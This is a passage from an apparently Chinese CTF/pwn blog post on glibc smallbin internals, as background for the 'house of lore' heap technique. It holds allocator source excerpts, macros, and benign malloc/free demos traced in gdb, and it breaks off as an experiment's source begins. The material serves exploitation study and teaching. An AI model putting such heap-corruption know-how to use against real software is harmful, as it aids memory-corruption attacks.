class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// in_smallbin_range可以看出free的堆块size在什么范围内会被放入smallbin中</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// smallbin_index这个宏定义可以看出每个相邻idx的堆块存储chunk的size大小相差多少</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br></pre></td></tr></table></figure><ul><li><code>smallbin</code>这个堆块结构也是一个<strong>先进先出</strong>的堆块结构，（堆块被释放后放入smallbin的过程与fastbin放入机制相同，都是使用头插法），只不过<code>smallbin</code>是双向链表。接下来给出一个<code>smallbin</code>大致的结构图，这样更有利于我们了解（以64位系统为例子），注意<code>smallbin</code>和<code>largebin</code>中是这样的</li><li>而<code>smallbin</code>这个堆块的取出与<code>fastbin</code>堆块取出机制不同，fastbin取出的是最靠近bins的堆块。而<code>smallbin</code>是先取出的是<code>最远离bins</code>的堆块，即如果要使用smallbin的堆块时先取出的是<code>chunk0</code></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222202232637.png" alt="image-20250222202232637"></p><ul><li><p>被释放的堆块被放入<code>smallbin</code>的条件：</p><ul><li>首先被释放的堆块要符合<code>smallbin</code>堆块大小的范围：</li><li>接下来分析一下代码得出如下结论：当我们释放一个堆块，这个堆块被放入<code>unsortedbin</code>后，我们之后再申请一个堆块，这个堆块的申请如果既没有使用<code>unsortedbin</code>中的堆块，也没有使用<code>smallbin</code>中的堆块，这样先前被放入<code>unsortedbin</code>中的堆块就会被放入<code>smallbin</code></li><li>当<code>smallbin</code>中的堆块被切割后，切割后的堆块会先放入<code>unsortedbin</code>中（因为size位改变，现在的chunk中的size并不在当前<code>smallbin</code>范围中），之后我们再使用<code>malloc</code>申请一个堆块，并且申请的堆块没有使得<code>unsortedbin</code>中的堆块被切割，那么在<code>unsortedbin</code>中的堆块就会被放入<code>smallbin</code>中的堆块</li></ul></li><li><p>接下来我们给出一个示例程序：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> *p1,*p2,*p3,*p4,*p5;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x210</span>); <span class="comment">// 申请一个比较大的堆块，这个堆块释放后会先被放入unsoertedbin中</span></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);  <span class="comment">// 再申请一个小堆块，这个堆块防止p1所指向的堆块释放后与top_chunk合并</span></span><br><span class="line">    <span class="built_in">free</span>(p1); <span class="comment">// 释放p1指向的堆块,这样就可以使得该堆块放入unsortedibin</span></span><br><span class="line">    p3 = <span class="built_in">malloc</span>(<span class="number">0x300</span>); <span class="comment">// 之后我们申请一个更大的堆块，使得该堆块不能从放入unsortedbin 中的堆块切割，在malloc过程中既然没有切割，那么在unsortedbin中的堆块就会被放入smallbin</span></span><br><span class="line">    p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);  <span class="comment">// 申请一个0x10的堆块，这时就会从smallbin中切割一个堆块，并且将切割后的堆块重新放入unsortedbin中</span></span><br><span class="line">    p5 = <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">// 再申请一个大堆块，这样unsortedbin中的堆块又会被放入smallbin 中</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -o test test.c</span></span><br></pre></td></tr></table></figure><ul><li>接下来我们使用gdb动态调试查看一下堆块的运行机制。我们先申请一个<code>p1</code>堆块和<code>p2</code>堆块。</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222122624890.png" alt="image-20250222122624890"></p><ul><li>然后将<code>p1</code>堆块释放，该堆块就会被放入<code>unsortedbin</code>中</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222122701715.png" alt="image-20250222122701715"></p><ul><li>然后我们再申请一个<code>p3</code>堆块，这样<code>p1</code>堆块就会被放入<code>smallbin[idx1]</code>中管理</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222122743374.png" alt="image-20250222122743374"></p><ul><li>然后我们再申请一个<code>p4</code>堆块，这样原来的<code>p1</code>堆块就会被切割，并放入<code>unsortebin</code>中</li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222122835685.png" alt="image-20250222122835685"></p><ul><li>之后申请一个<code>p5</code>的堆块，这样<code>p1</code>堆块就会又被放入<code>smallbin[idx2]</code>中管理，其中<code>idx2 &lt; idx1</code></li></ul><p><img src="/2025/02/12/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-lore/image-20250222123013521.png" alt="image-20250222123013521"></p><ul><li>此外还可以进行这样的动态调试去查看<code>smallbins</code>是的双向链表机制</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> *p1,*p2,*p3,*p4;</span><br><span class="line">        p1 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p2 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        p3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p2);</span><br><span class="line">        p4 = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="相关代码"><a class="markdownIt-Anchor" href="#相关代码"></a> 相关代码</h2><ul><li>接下来给出<code>glibc2.23</code>中的<code>smallbin</code>的相关源码。</li><li>下面是<code>malloc</code>中关于smallbin的代码</li></ul><details>    <summayr>_int_malloc相关源码</summayr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">            If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">            only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">            runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">            exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">            no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">             bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">             victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">             (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             remainder = chunk_at_offset (victim, nb);</span><br><span class="line">             unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">             av-&gt;last_remainder = remainder;</span><br><span class="line">             remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">             <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">               &#123;</span><br><span class="line">                 remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">             set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">             set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = smallbin_index (size);</span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">         <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">             (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">           &#123;</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line">             <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">               victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                list does not have to be rerouted.  */</span></span><br><span class="line">             <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">               victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Exhaust */</span></span><br><span class="line">             <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">               &#123;</span><br><span class="line">                 set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                 <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                   victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="comment">/* Split */</span></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                 <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">                 bck = unsorted_chunks (av);</span><br><span class="line">                 fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                   &#123;</span><br><span class="line">                     errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                     <span class="keyword">goto</span> errout;</span><br><span class="line">                   &#125;</span><br><span class="line">                 remainder-&gt;bk = bck;</span><br><span class="line">                 remainder-&gt;fd = fwd;</span><br><span class="line">                 bck-&gt;fd = remainder;</span><br><span class="line">                 fwd-&gt;bk = remainder;</span><br><span class="line">                 <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                   &#123;</span><br><span class="line">                     remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                     remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                 set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                 set_foot (remainder, remainder_size);</span><br><span class="line">               &#125;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></details><ul><li>下面是<code>_int_free</code>中的smallbin相关操作</li></ul><details>    <summary>_int_free中的源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">     p-&gt;fd = fwd;</span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>相关宏定义</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// min_large_size存储在largebin的最小值,也就是smallbin存储堆块size的最大范围</span></span><br><span class="line"><span class="comment">// NSMALLBINS在下方有宏定义,定义的值为64</span></span><br><span class="line"><span class="comment">// SMALLBIN_WIDTH也是一个宏定义,定义的值为MALLOC_ALIGNMENT,而MALLOC_ALIGNMENT也是一个宏定义其具体值为2 *SIZE_SZ</span></span><br><span class="line"><span class="comment">// 32位系统2 *SIZE_SZ=8字节,64位系统2 *SIZE_SZ=16字节</span></span><br><span class="line"><span class="comment">// SMALLBIN_CORRECTION也是一个宏定义,其值不是1就是0,一般情况下都为0</span></span><br><span class="line"><span class="comment">// 所以在32位系统MIN_LARGE_SIZE = 64 * 8 = 512字节</span></span><br><span class="line"><span class="comment">// 所以在64位系统MIN_LARGE_SIZE = 64 * 16 = 1024字节</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS             128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS         64</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// in_smallbin_range可以看出free的堆块size在什么范围内会被放入smallbin中</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz)  \</span></span><br><span class="line"><span class="meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// smallbin_index这个宏定义可以看出每个相邻idx的堆块存储chunk的size大小相差多少      </span></span><br><span class="line"><span class="comment">// SMALLBIN_WIDTH的值在32位为8，在64位系统为16,如果SMALLBIN_WIDTH为真则返回sz&gt;&gt;4   </span></span><br><span class="line"><span class="comment">// 如果SMALLBIN_WIDTH为假则返回 sz &gt;&gt; 3 +  SMALLBIN_CORRECTION(这个值一般为0)</span></span><br><span class="line"><span class="comment">// 也就是说在64位系统中相邻index的堆块size相差0x10字节,在32位系统中相邻index的堆块size相差0x8字节</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">   + SMALLBIN_CORRECTION)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> first(b)     ((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure></details><ul><li>在<code>glibc2.27</code>中添加了一个检查机制</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></table></figure><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><details>    <summary>源码</summary><p>​</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 